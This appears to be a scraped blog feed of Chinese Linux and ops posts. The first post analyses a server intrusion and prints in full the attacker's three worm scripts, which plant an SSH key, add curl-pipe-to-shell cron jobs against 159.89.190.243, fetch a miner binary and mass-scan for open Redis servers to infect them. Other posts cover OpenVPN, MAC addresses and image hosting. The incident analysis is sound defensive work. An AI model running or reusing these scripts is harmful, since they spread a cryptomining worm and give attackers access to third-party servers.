2、这个文件的目的是什么，或是黑客想干嘛？\nhistory看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages，\n看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。\ncrontab -e 果然，线索找到了。\n上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。\ncurl -fsSL 159.89.190.243/ash.php \u0026gt; ash.sh 脚本内容如下：\nuname -aidhostnamesetenforce 0 2\u0026gt;/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2\u0026gt;/dev/nullrm -rf /var/spool/cron/* 2\u0026gt;/dev/nullmkdir -p /var/spool/cron/crontabs 2\u0026gt;/dev/nullmkdir -p /root/.ssh 2\u0026gt;/dev/nullecho \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX\u0026#39; \u0026gt; /root/.ssh/authorized_keysecho \u0026#39;*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt; /var/spool/cron/rootecho \u0026#39;*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt; /var/spool/cron/crontabs/rootyum install -y bash 2\u0026gt;/dev/nullapt install -y bash 2\u0026gt;/dev/nullapt-get install -y bash 2\u0026gt;/dev/nullbash -c \u0026#39;curl -fsSL 159.89.190.243/bsh.php|bash\u0026#39; 2\u0026gt;/dev/null 大致分析一下该脚本的主要用途：\n首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章SSH原理与运用。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。\n继续下载并分析bsh.pbp，内容如下：\nsleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... \u0026amp;\u0026amp; chmod -R 777 .ICE-unix \u0026amp;\u0026amp; cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 \u0026gt; .watchsleep 1ps x | awk \u0026#39;!/awk/ \u0026amp;\u0026amp; /redisscan|ebscan|redis-cli/ {print $1}\u0026#39; | xargs kill -9 2\u0026gt;/dev/nullps x | awk \u0026#39;!/awk/ \u0026amp;\u0026amp; /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}\u0026#39; | xargs kill -9 2\u0026gt;/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho \u0026#39;/usr/bin/gpg-agentd\u0026#39; \u0026gt; /etc/rc.localecho \u0026#39;curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt;\u0026gt; /etc/rc.localecho \u0026#39;exit 0\u0026#39; \u0026gt;\u0026gt; /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd \u0026amp;\u0026amp; /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x \u0026#34;$(command -v masscan)\u0026#34; ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x \u0026#34;$(command -v apt-get)\u0026#34; ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x \u0026#34;$(command -v yum)\u0026#34; ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] \u0026amp;\u0026amp; tar zxf x1.tar.gz \u0026amp;\u0026amp; cd masscan-1.0.4 \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install \u0026amp;\u0026amp; cd .. \u0026amp;\u0026amp; rm -rf masscan-1.0.4fisleep 3 \u0026amp;\u0026amp; rm -rf .watchbash -c \u0026#39;curl -fsSL 159.89.190.243/rsh.php|bash\u0026#39; 2\u0026gt;/dev/null 这段脚本的代码比较长，但主要的功能有4个：\n\\1. 下载远程代码到本地，添加执行权限，chmod u+x。 \\2. 修改rc.local，让本地代码开机自动执行。 \\3. 下载github上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。 \\4. 下载第三个脚本，并且执行。\n我去github上看了下这个开源代码，简直吊炸天。\nMASSCAN: Mass IP port scanner This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, \u0026gt; transmitting 10 million packets per second. It produces results similar to nmap, the most famous port scanner. Internally, it operates more \u0026gt; like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is \u0026gt; that it\u0026rsquo;s faster than these other scanners. In addition, it\u0026rsquo;s more flexible, allowing arbitrary \u0026gt; address ranges and port ranges. NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.\ntransmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。\nsetenforce 0 2\u0026gt;/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2\u0026gt;/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2\u0026gt;/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2\u0026gt;/dev/nullsleep 1echo \u0026#39;config set dbfilename \u0026#34;backup.db\u0026#34;\u0026#39; \u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;flushall\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup1 \u0026#34; */2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup2 \u0026#34; */3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup3 \u0026#34; */4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup4 \u0026#34; */5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dir \u0026#34;/var/spool/cron/\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dbfilename \u0026#34;root\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dir \u0026#34;/var/spool/cron/crontabs\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2\u0026gt;/dev/null | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2\u0026gt;/dev/null | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .rangessleep 1ip a | grep -oE \u0026#39;([0-9]{1,3}.?){4}/[0-9]{2}\u0026#39; 2\u0026gt;/dev/null | sed \u0026#39;s//([0-9]{2})//16/g\u0026#39; \u0026gt; .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .lansleep 60rm -rf .dat .shard .ranges .lan 2\u0026gt;/dev/null 如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。\n一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。\n通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：\n还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin,eth, mine等相关单词，最终发现了这个：\n打开 nicehash.com 看一下，一切都清晰了。\n一、服务器\n\\1. 禁用ROOT \\2. 用户名和密码尽量复杂 \\3. 修改ssh的默认22端口 \\4. 安装DenyHosts防暴力破解软件 \\5. 禁用密码登录，使用RSA公钥登录\n二、redis\n\\1. 禁用公网IP监听，包括0.0.0.0 \\2. 使用密码限制访问redis \\3. 使用较低权限帐号运行redis\n原文链接：https://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA\n","permalink":"https://lvbibir.github.io/posts/tech/record_of_server_attacked/","summary":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁","title":"记一次服务器被入侵全过程"},{"content":"介绍 项目地址\n这个项目准备打造一个安全基线检查平台，期望能够以最简单的方式在需要进行检查的服务器上运行。能够达到这么一种效果：基线检查脚本(以后称之为agent)可以单独在目标服务器上运行，并展示出相应不符合基线的地方，并且可以将检查时搜集到的信息以json串的形式上传到后端处理服务器上，后端服务器可以进行统计并进行可视化展示。\nAgent用到的技术：\nShell脚本 Powershell脚本 后端服务器用到的技术：\npython django bootstrap html 存储所用：\nsqlite3 前端页面部署 环境 系统 centos7.8(最小化安装) 前端：192.168.150.101 client端：192.168.150.102 安装python3.6 源码包下载地址\nyum install gcc gcc-c++ zlib-devel sqlite-devel mariadb-server mariadb-devel openssl-devel tcl-devel tk-devel tree libffi-devel -y tar -xf Python-3.6.10.tgz ./configure --enable-optimizations make make install python3 -V 安装pip3+django 源码包下载地址\ntar zxvf pip-21.0.1.tar.gz cd pip-21.0.1/ python3 setup.py build python3 setup.py install pip3 install django==2.2.15 git clone项目到本地 yum install -y git git clone https://github.com/chroblert/assetmanage.git 部署server端项目 cd assetManage # 使用python3安装依赖包 python3 -m pip install -r requirements.txt python3 manage.py makemigrations python3 manage.py migrate python3 manage.py runserver 0.0.0.0:8888 # 假定该服务器的IP未112.112.112.112 访问测试：http://192.168.150.101:8888/\n客户端进行检查 将项目目录中的Agent目录copy到需要进行基线检查的客户端 scp -r assetmanage/Agent/ 192.168.150.102:/root/ cd Agent/ chmod a+x ./*.sh 修改 linux_baseline_check.sh 文件的最后一行，配置前端django项目的ip和端口 运行脚本即可，终端会有检查结果的输出，前端页面相应也会有数据 ","permalink":"https://lvbibir.github.io/posts/tech/centos7_deploy_benchmark/","summary":"介绍 项目地址 这个项目准备打造一个安全基线检查平台，期望能够以最简单的方式在需要进行检查的服务器上运行。能够达到这么一种效果：基线检查脚本(以","title":"centos7基线检查平台部署"},{"content":" 环境：centos7.8 在centos中可以在如下文件中查看一个NIC的配置 ： /etc/sysconfig/network-scripts/ifcfg-N\nHWADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的硬件地址.在有多个网卡设备的机器上，这个字段是非常有用的，它保证设备接口被分配了正确的设备名 ，而不考虑每个网卡模块被配置的加载顺序.这个字段不能和MACADDR一起使用.\nMACADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的硬件地址.在有多个网卡设备的机器上.这个字段用于给一个接口分配一个MAC地址，覆盖物理分配的MAC地址 . 这个字段不能和HWADDR一起使用.\n简单总结一下：\nMACADDR是系统的网卡物理地址，因为在接收数据包时需要根据这个值来做包过滤。 HWADDR是网卡的硬件物理地址，只有厂家才能修改 可以用MACADDR来覆盖HWADDR，但这两个参数不能同时使用 ifconfig和nmcli等网络命令中显示的物理地址其实是MACADDR的值，虽然显示的名称写的是HWADDR(ether)。 修改网卡的mac地址\n#sudo vim /etc/sysconfig/network-scripts/ifcfg-ens32 注释其中的\u0026#34;HWADDR=xx:xx:xx:xx:xx:xx\u0026#34; 添加或者修改\u0026#34;MACADDR=xx:xx:xx:xx:xx:xx\u0026#34; 如果没有删除或者注释掉HWADDR，当HWADDR与MACADDR地地不同时，启动不了网络服务的提示：　“Bringing up interface eth0: Device eth0 has different MAC address than expected,ignoring.” 故正确的操作是将HWADDR删除或注释掉，改成MACADDR 查看系统初始的mac地址即HWADDR 把配置文件中的MACADDR注释或者删除掉，不用配置HWADDR，重启网络服务后用命令查看到的mac地址就是网卡的HWADDR\n参考 https://blog.csdn.net/rikeyone/article/details/108406865\nhttps://zhidao.baidu.com/question/505133906.html\nhttps://blog.csdn.net/caize340724/article/details/100958968?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.control\u0026amp;spm=1001.2101.3001.4242\n","permalink":"https://lvbibir.github.io/posts/tech/hwaddr_macaddr_different/","summary":"环境：centos7.8 在centos中可以在如下文件中查看一个NIC的配置 ： /etc/sysconfig/network-scripts/ifcfg-N HWADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的","title":"hwaddr和macaddr的区别"},{"content":"一、实验环境 3台centos6.5，1台win10，openvpn-2.4.7，easy-rsa-3.0.5\n二、拓扑结构 Win10安装openvpn-gui，三台centos6.5为vmware虚拟机，分为client、vpnserver、proxy\n三台centos6.5的eth0网卡均为内网(lan区段)地址1.1.1.0/24网段，proxy额外添加一块eth1网卡设置nat模式模拟外网ip\n三、实验目的 win10访问proxy的外网ip对应端口连接到vpnserver，分配到内网ip后可以访问到client\n四、实验思路 proxy配置ipv4转发，将访问到本机eth1网卡相对应的端口上的流量转发给vpnserver的vpn服务端口\nvpnserver为win10分配ip实现访问内网\n五、实施步骤 1.初始化环境 虚拟机安装过程 略\n配置ip client： 1.1.1.1/24\nvpnserver：1.1.1.2/24\nproxy：\t1.1.1.3/24 192.168.150.114/24\nwin10：\t192.168.150.1/24\n环境初始化（client和vpnserver关闭iptables和selinux，proxy仅关闭selinux） [root@vpnserver ~]# sed -i \u0026lsquo;/SELINUX/s/enforcing/disabled/\u0026rsquo; /etc/selinux/config [root@vpnserver ~]# setenforce 0\n2.安装vpnserver及easy-rsa vpnserver安装openvpn 由于centos6的所有官方源已失效，使用https://www.xiaofeng.org/article/2019/10/centos6buildinstallopenvpnrpm-17.html中的方法将源码编译成rpm包。\nopenvpn版本：2.4.7\n下载easy-rsa 下载地址：https://github.com/OpenVPN/easy-rsa/tree/v3.0.5\n3.创建openvpn目录，配置vars变量 解压easy-rsa目录 [root@vpnserver ~]# mkdir openvpn [root@vpnserver ~]# unzip easy-rsa-3.0.5.zip [root@vpnserver ~]# mv easy-rsa-3.0.5 easy-rsa [root@vpnserver ~]# mkdir -p /etc/openvpn [root@vpnserver ~]# cp -a easy-rsa /etc/openvpn\n配置/etc/openvpn目录 [root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# cp vars.example vars [root@vpnserver easyrsa3]# vim vars 添加如下变量\nset_var EASYRSA_REQ_COUNTRY \u0026#34;CN\u0026#34; set_var EASYRSA_REQ_PROVINCE \u0026#34;Beijing\u0026#34; set_var EASYRSA_REQ_CITY \u0026#34;Beijing\u0026#34; set_var EASYRSA_REQ_ORG \u0026#34;lvbibir\u0026#34; set_var EASYRSA_REQ_EMAIL \u0026#34;lvbibir@163.com\u0026#34; set_var EASYRSA_REQ_OU \u0026#34;My OpenVPN\u0026#34; 4.创建服务端证书及key 创建服务端证书及key 初始化\n[root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa init-pki\n创建根证书\n[root@vpnserver easyrsa3]# ./easyrsa build-ca\n注意：在上述部分需要输入PEM密码 PEM pass phrase，输入两次，此密码必须记住，不然以后不能为证书签名。还需要输入common name 通用名，这个你自己随便设置个独一无二的\n创建服务器端证书\n[root@vpnserver easyrsa3]# ./easyrsa gen-req server nopass\n该过程中需要输入common name，随意但是不要跟之前的根证书的一样\n签约服务端证书\n[root@vpnserver easyrsa3]# ./easyrsa sign server server\n需要手动输入yes去人，还需要提供创建ca证书时的密码\n创建Diffie-Hellman，确保key穿越不安全网络的命令\n[root@vpnserver easyrsa3]# ./easyrsa gen-dh\n5.创建客户端证书及key 创建客户端证书 初始化\n[root@vpnserver ~]# mkdir client [root@vpnserver ~]# cd client/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa init-pki\n需输入yes确认\n创建客户端key及生成证书\n[root@vpnserver easyrsa3]# ./easyrsa gen-req zhijie.liu\n名字自己自定义，该密码是用户使用该key登录时输入的密码，可以加nopass参数在客户端登录时无需输入密码\n导入req证书\n[root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa import-req /root/client/easy-rsa/easyrsa3/pki/reqs/zhijie.liu.req zhijie.liu\n签约证书\n[root@vpnserver easyrsa3]# ./easyrsa sign client zhijie.liu\n这里生成client，名字要与之前导入名字一致\n签约证书期间需要输入yes确认，期间需要输入CA的密码\n6.归置服务器和客户端的证书 把服务器端必要文件放到/etc/openvpn下（ca证书、服务端证书、密钥） [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/ca.crt /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/private/server.key /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/issued/server.crt /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/dh.pem /etc/openvpn/\n把客户端必要文件放到/root/client目录下（客户端的证书、密钥） [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/ca.crt /root/client [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/issued/zhijie.liu.crt /root/client/ [root@vpnserver ~]# cp /root/client/easy-rsa/easyrsa3/pki/private/zhijie.liu.key /root/client\n7.vpn服务端server.conf配置文件修改 为服务器端编写配置文件 安装好配置文件后他会提供一个server配置的文件案例，将该文件放到/etc/openvpn下\n[root@vpnserver ~]# rpm -ql openvpn | grep server.conf\n[root@vpnserver ~]# cp /usr/share/doc/openvpn-2.4.7/sample/sample-config-files/server.conf /etc/openvpn/\n修改配置文件 [root@vpnserver ~]# vim /etc/openvpn/server.conf\n[root@vpnserver ~]# grep \u0026#39;^[^#|;]\u0026#39; /etc/openvpn/server.conf local 0.0.0.0 #监听地址 port 1194 #监听端口 proto tcp #监听协议 dev tun #采用路由隧道模式 ca /etc/openvpn/ca.crt #ca证书路径 cert /etc/openvpn/server.crt #服务器证书 key /etc/openvpn/server.key # This file should be kept secret 服务器秘钥 dh /etc/openvpn/dh.pem #密钥交换协议文件 server 10.8.0.0 255.255.255.0 #给客户端分配地址池，注意：不能和VPN服务器内网网段有相同 ifconfig-pool-persist ipp.txt push \u0026#34;route 1.1.1.0 255.255.255.0\u0026#34;\t#推送内网地址 client-to-client #客户端之间互相通信 keepalive 10 120 #存活时间，10秒ping一次,120 如未收到响应则视为断线 comp-lzo #传输数据压缩 max-clients 100 #最多允许 100 客户端连接 user openvpn #用户 group openvpn #用户组 persist-key persist-tun status /var/log/openvpn/openvpn-status.log log /var/log/openvpn/openvpn.log verb 3 8.后续设置（用户、iptables和路由转发） 后续设置 [root@vpnserver ~]# mkdir /var/log/openvpn/ [root@vpnserver ~]# useradd openvpn -s /sbin/nologin [root@vpnserver ~]# chown -R openvpn.openvpn /var/log/openvpn/ [root@vpnserver ~]# chown -R openvpn.openvpn /etc/openvpn/*\niptables设置nat规则和打开路由转发 [root@vpnserver ~]# iptables -A INPUT -p tcp \u0026ndash;dport 1194 -j ACCEPT [root@vpnserver ~]# iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE [root@vpnserver ~]# iptables -vnL -t nat\nChain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 0 0 MASQUERADE all -- * * 10.8.0.0/24 0.0.0.0/0 Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination [root@vpnserver ~]# vim /etc/sysctl.conf\nnet.ipv4.ip_forward = 1 [root@vpnserver ~]# sysctl -p\n开启openvpn服务 [root@vpnserver ~]# openvpn \u0026ndash;daemon \u0026ndash;config /etc/openvpn/server.conf [root@vpnserver ~]# netstat -anput | grep 1194\nproxy开启端口转发/映射 [root@along ~]# vim /etc/sysctl.conf //打开路由转发\nnet.ipv4.ip_forward = 1 [root@proxy ~]# sysctl -p\n[root@proxy ~]# iptables -t nat -A PREROUTING -d 192.168.150.114 -p tcp \u0026ndash;dport 1194 -j DNAT \u0026ndash;to-destination 1.1.1.2:1194 [root@proxy ~]# iptables -t nat -A POSTROUTING -d 1.1.1.2 -p tcp \u0026ndash;dport 1194 -j SNAT \u0026ndash;to 1.1.1.3 [root@proxy ~]# iptables -A FORWARD -o eth0 -d 1.1.1.2 -p tcp \u0026ndash;dport 1194 -j ACCEPT [root@proxy ~]# iptables -A FORWARD -i eth0 -s 1.1.1.2 -p tcp \u0026ndash;sport 1194 -j ACCEPT\n[root@proxy ~]# iptables -A INPUT -p tcp \u0026ndash;dport 1194 -j ACCEPT\n[root@proxy ~]# service iptables save [root@proxy ~]# service iptables reload [root@proxy ~]# iptables -L -n\n六、客户段连接测试 下载openvpn客户端 略\n1.配置client端配置文件 [root@vpnserver ~]# rpm -ql openvpn | grep client.ovpn\n/usr/share/doc/openvpn-2.4.7/sample/sample-plugins/keying-material-exporter-demo/client.ovpn\n[root@vpnserver ~]# cp /usr/share/doc/openvpn-2.4.7/sample/sample-plugins/keying-material-exporter-demo/client.ovpn /root/client [root@vpnserver ~]# vim /root/client/client.ovpn\nclient dev tun proto tcp remote 192.168.150.114 1194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert client.crt key client.key comp-lzo verb 3\n2.拷贝客户端证书及配置文件 vpnserver没装vmtools所以先将所有文件放到proxy上然后通过远程工具下载\n[root@vpnserver openvpn]# scp /root/client/ca.crt root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/zhijie.liu.crt root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/zhijie.liu.key root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/client.ovpn root@1.1.1.3:/root/\n将这四个文件放到win10的C:\\Users\\lvbibir\\OpenVPN\\config目录下\n3.ping测试 ping client的内网ip1.1.1.1\n参考：\ncentos6源码编译openvpn并打包成rpm\nhttps://www.xiaofeng.org/article/2019/10/centos6buildinstallopenvpnrpm-17.html\nopenvpn源码下载地址\nhttps://openvpn.net/community-downloads/\ncentos6搭建openvpn\nhttp://www.likecs.com/show-6021.html\ncentos6做端口映射/端口转发\nhttps://blog.csdn.net/weixin_30872499/article/details/96654741?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0\u0026amp;spm=1001.2101.3001.4242\n","permalink":"https://lvbibir.github.io/posts/tech/centos6_deploy_openvpn/","summary":"一、实验环境 3台centos6.5，1台win10，openvpn-2.4.7，easy-rsa-3.0.5 二、拓扑结构 Win10安装ope","title":"openvpn部署"},{"content":"前言 cve 官网或者工信部会发布一些 cve 漏洞，可以看到该漏洞在某次 commit 提交代码后修复的，可以通过检索 kernel.org 中所有内核版本的 ChangeLog 文件中是否包含该 commit 来判断漏洞影响的内核版本（仅针对 linux 的 kernel 相关的漏洞）\n脚本 #!/bin/bash # author: lvbibir # date: 2022-06-23 # 检索 kernel.org 下的所有 ChangeLog 文件，是否包含某项特定的 commit 号 commit=\u0026#39;520778042ccca019f3ffa136dd0ca565c486cedd\u0026#39; version=4 number=0 curl -ks https://cdn.kernel.org/pub/linux/kernel/v$version\\.x/ \u0026gt; list_$version cat list_$version | grep Change | grep -v sign | awk -F\\\u0026#34; \u0026#39;{print $2}\u0026#39; \u0026gt; list_$version\\_cut total=`wc -l list_$version\\_cut | awk \u0026#39;{print $1}\u0026#39;` while read line; do let \u0026#39;number+=1\u0026#39; url=\u0026#34;https://cdn.kernel.org/pub/linux/kernel/v$version.x/$line\u0026#34; echo -e \u0026#34;\\033[31m---------------------正在检索$url----------------第$number 个文件，共$total 个文件\\033[0m\u0026#34; curl -ks $url | grep $commit if [ $? -eq 0 ]; then echo $url \u0026gt;\u0026gt; ./result_$version fi done \u0026lt; ./list_$version\\_cut echo -e \u0026#34;\\033[32m脚本执行完成，结果已保存至当前目录的 result_$version \\033[0m\u0026#34; ","permalink":"https://lvbibir.github.io/posts/tech/shell_search_url_files/","summary":"前言 cve 官网或者工信部会发布一些 cve 漏洞，可以看到该漏洞在某次 commit 提交代码后修复的，可以通过检索 kernel.org 中所有内核版本的 ChangeLog 文件中是否包含该 commit 来判断漏洞影","title":"shell脚本之检索某url中所有文件的内容"},{"content":"七牛云配置 1、注册七牛云，新建存储空间 这里就不介绍七牛云的注册和新建空间了\n七牛云新用户有10G的免费空间，作为个人博客来说基本足够了\n2、为存储空间配置加速域名 这里使用http就可，https还需要证书，有点麻烦\n3、配置域名解析 到域名厂商配置cname记录，我的域名是阿里的\n在控制台首页进入dns配置\n配置cname\nPicGo配置 下载安装 下载链接：https://github.com/Molunerfinn/PicGo/releases/\n建议下载稳定版\n配置七牛云图床 主流图床都有支持\n配置七牛图床\nak和sk在七牛云→个人中心→密钥管理中查看\ntypora测试图片上传 下载地址：https://www.typora.io/\n在文件→偏好设置→图像中配置图片上传，选择安装好的PicGo的应用程序\n点击验证图片上传\n到七牛云存储空间看是否有这两个文件\ntypora可以实现自动的图片上传，并将本地连接自动转换为外链地址\n可能的报错 报错 {“success”,false} 上传图片报错：\n看日志：\n日志路径：C:\\Users\\lvbibir\\AppData\\Roaming\\picgo\nfailed to fetch Picgo配置完七牛云图床，使用typora测试图片上传\n报错：failed to fetch\n看日志\n日志路径：C:\\Users\\lvbibir\\AppData\\Roaming\\picgo\n问题在于端口冲突，如果你打开了多个picgo程序，就会端口冲突，picgo自动帮你把36677端口改为366771端口，导致错误。log文件里也写得很清楚。\n解决\n修改picgo的监听端口\n重新验证\n","permalink":"https://lvbibir.github.io/posts/blog/typora_picgo_qiniu_upload_image/","summary":"七牛云配置 1、注册七牛云，新建存储空间 这里就不介绍七牛云的注册和新建空间了 七牛云新用户有10G的免费空间，作为个人博客来说基本足够了 2、为存","title":"typora+picgo+七牛云上传图片"},{"content":"现象 博客加载不出来我在七牛云的图片资源 使用浏览器直接访问图片url却是可以成功的 我将之前csdn的博客迁移到了wordpress，图片外链地址就是csdn的，都可以正常加载。 使用浏览器直接访问图片url却是可以成功的\n我将之前csdn的博客迁移到了wordpress，图片外链地址就是csdn的，都可以正常加载。\n排查 